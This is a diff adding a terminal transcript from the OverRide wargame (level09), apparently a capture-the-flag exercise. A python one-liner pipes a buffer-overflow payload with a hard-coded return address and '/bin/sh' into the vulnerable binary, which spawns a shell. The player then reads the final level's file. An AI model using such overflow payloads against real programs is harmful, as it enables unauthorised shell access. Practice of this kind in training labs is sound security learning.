@@ -1,0 +1,14 @@
+level09@OverRide:~$ (python -c 'print "B"*40+"\xff"+"\n"+"B"*200+"\x8c\x48\x55\x55\x55\x55\x00\x00"+"\n"+"/bin/sh\n"'; cat) | ./level09 
+--------------------------------------------
+|   ~Welcome to l33t-m$n ~    v1337        |
+--------------------------------------------
+>: Enter your username
+>>: >: Welcome, BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB�>: Msg @Unix-Dude
+>>: >: Msg sent!
+whoami
+end
+ls
+ls: cannot open directory .: Permission denied
+cd ../end
+cat end
+GG !
